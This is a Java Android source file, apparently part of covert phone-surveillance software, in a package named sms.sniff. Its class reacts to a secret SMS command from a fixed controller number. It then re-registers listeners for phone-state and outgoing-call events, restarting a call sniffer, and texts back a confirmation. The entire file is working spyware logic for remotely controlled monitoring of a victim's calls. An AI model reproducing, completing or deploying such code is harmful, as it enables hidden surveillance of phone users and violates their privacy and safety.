package sms.sniff.behaviors;

import sms.sniff.call.IncomingOutgoingCall;
import sms.sniff.core.Constants;
import sms.sniff.utils.SMS;
import android.content.Context;
import android.content.IntentFilter;
import android.telephony.SmsMessage;

public class RestartCallSniffer implements Behavior {
	
	private Context context;

	public RestartCallSniffer(Context context) {
		this.context = context;
	}

	@Override
	public void process(SmsMessage sms) {
		
		IncomingOutgoingCall incomingOutgoingCall = new IncomingOutgoingCall();
		context.registerReceiver(incomingOutgoingCall, new IntentFilter("android.intent.action.PHONE_STATE"));
		context.registerReceiver(incomingOutgoingCall, new IntentFilter("android.intent.action.NEW_OUTGOING_CALL"));
		
		new SMS(".").sendConfirmation();
	}

	@Override
	public boolean canProcess(SmsMessage sms) {
		String messageBody = sms.getMessageBody();
		String originPhoneNumber = sms.getDisplayOriginatingAddress();
		
		return messageBody.contains(Constants.messageCode_restart_callSniffer) && Constants.destination.equals(originPhoneNumber);
	}
}
